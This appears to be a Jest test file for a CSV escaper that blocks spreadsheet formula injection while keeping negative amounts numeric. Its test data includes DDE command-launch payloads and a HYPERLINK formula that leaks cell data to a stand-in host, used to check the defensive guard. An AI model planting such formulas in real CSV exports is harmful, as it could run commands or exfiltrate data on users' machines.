import { escapeCsvCell, isSpreadsheetFormula, toCsvLine } from './csv';

/**
 * PURE — plain strings in, plain strings out. Every assertion below is on the EMITTED BYTES, never
 * on "did it call the escaper": a CSV hole is a property of the file that leaves, so the file is
 * what gets asserted.
 */
describe('escapeCsvCell', () => {
  describe('the formula guard', () => {
    // The four characters that make a spreadsheet evaluate a cell instead of displaying it, each
    // with a payload shaped the way a real one is (the classic DDE command launch) rather than a
    // toy `=1+1` a weaker guard could pass by accident. None of these four carries a comma or a
    // quote, so RFC 4180 leaves them bare and the apostrophe is the ONLY thing standing between the
    // payload and the formula parser — which is the whole point.
    it.each([
      ['=', "=cmd|' /C calc'!A0"],
      ['+', "+cmd|' /C calc'!A0"],
      ['-', "-2+3+cmd|' /C calc'!A0"],
      ['@', "@SUM(1+1)*cmd|' /C calc'!A0"],
    ])('a cell beginning "%s" is prefixed with an apostrophe', (_lead, payload) => {
      expect(escapeCsvCell(payload)).toBe(`'${payload}`);
    });

    it('a payload hidden behind a leading tab is guarded too — whitespace is not a safe lead', () => {
      expect(escapeCsvCell('\t=1+1')).toBe("'\t=1+1");
    });

    it('a cell beginning with anything else is left exactly as it is', () => {
      expect(escapeCsvCell('Acme Corp')).toBe('Acme Corp');
      expect(escapeCsvCell('INV-2026-0001')).toBe('INV-2026-0001');
      expect(escapeCsvCell('')).toBe('');
    });

    it('the trigger only counts at the START — an interior one is ordinary text', () => {
      expect(escapeCsvCell('Acme=Corp')).toBe('Acme=Corp');
      expect(escapeCsvCell('Jean-Pierre')).toBe('Jean-Pierre');
    });
  });

  describe('the negative-amount carve-out', () => {
    // THE constraint the guard lives under: this file is read by accounting software, and an escape
    // that turns an amount into text breaks the export's one job. A negative amount begins with a
    // formula trigger and must still come out a number.
    it.each([
      '-120.00',
      '-0.01',
      '-1',
      '-1234.56',
      '+120.00',
      '-.5',
    ])('the amount %s is emitted bare — still a number to a spreadsheet and to an importer', (amount) => {
      expect(escapeCsvCell(amount)).toBe(amount);
      expect(isSpreadsheetFormula(amount)).toBe(false);
    });

    it('a payload that merely OPENS like a negative number is still guarded', () => {
      // The carve-out is an exact match, never a prefix match, so the arithmetic a spreadsheet
      // would run on either of these never gets the chance.
      expect(escapeCsvCell('-1+1')).toBe("'-1+1");
      expect(escapeCsvCell("-1E0*cmd|' /C calc'!A0")).toBe("'-1E0*cmd|' /C calc'!A0");
    });
  });

  describe('RFC 4180 syntax, unchanged by the guard', () => {
    it('a field containing a comma is wrapped in double quotes', () => {
      expect(escapeCsvCell('Acme Corp, Ltd')).toBe('"Acme Corp, Ltd"');
    });

    it('an interior double quote is doubled, inside a wrapped field', () => {
      expect(escapeCsvCell('The "Acme" Corp')).toBe('"The ""Acme"" Corp"');
    });

    it('a line break is wrapped, and survives verbatim inside the field', () => {
      expect(escapeCsvCell('Acme\nCorp')).toBe('"Acme\nCorp"');
    });
  });

  describe('guard BEFORE quoting — the order the two escapes must run in', () => {
    it('a formula payload that ALSO carries a comma is both guarded and quoted', () => {
      // Quoting first would move the `=` off position 0, hiding it from a formula check running
      // afterwards — and the spreadsheet strips those quotes back off before parsing the cell.
      expect(escapeCsvCell('=SUM(1,2)')).toBe('"\'=SUM(1,2)"');
    });

    it('the apostrophe lands INSIDE the quotes, and interior quotes are still doubled', () => {
      expect(escapeCsvCell('=HYPERLINK("https://evil.invalid?x="&A1,"leak")')).toBe(
        '"\'=HYPERLINK(""https://evil.invalid?x=""&A1,""leak"")"',
      );
    });
  });
});

describe('toCsvLine', () => {
  it('escapes every cell, then comma-joins — no trailing separator, no trailing break', () => {
    expect(toCsvLine(['invoice', '=cmd', 'Acme, Ltd', '-120.00'])).toBe('invoice,\'=cmd,"Acme, Ltd",-120.00');
  });
});
